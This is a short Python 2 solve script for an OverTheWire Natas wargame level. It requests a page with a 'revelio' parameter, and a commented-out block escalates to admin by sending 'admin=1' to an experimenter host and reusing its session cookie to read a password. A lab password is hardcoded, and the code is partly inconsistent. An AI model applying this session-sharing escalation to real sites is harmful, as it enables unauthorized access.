import requests

protocol = 'http://'
username = 'natas22'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
url = username + '.natas.labs.overthewire.org/'
login = username + ':' + password + '@'
params = '?revelio='
target = protocol + login + url + params

r = requests.get( target )
c = r.cookies['PHPSESSID']

#idx = r.content.find('Password: ')
#print r.content[ idx : idx + 42 ]


"""
protocol = 'http://'
username = 'natas22'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
url = username + '.natas.labs.overthewire.org/'
login = username + ':' + password + '@'
params = '?revelio='
target = protocol + login + url + params

url1 = "natas21-experimenter.natas.labs.overthewire.org/"
params1 = '?debug=&admin=1&submit='
target1 = protocol + login + url1 + params1

r1 = requests.get( target1 )
c = r1.cookies['PHPSESSID']

r = requests.get( target, cookies=dict( PHPSESSID=c ) )
idx = r.content.find('Password: ')
print r.content[ idx : idx + 42 ]
"""

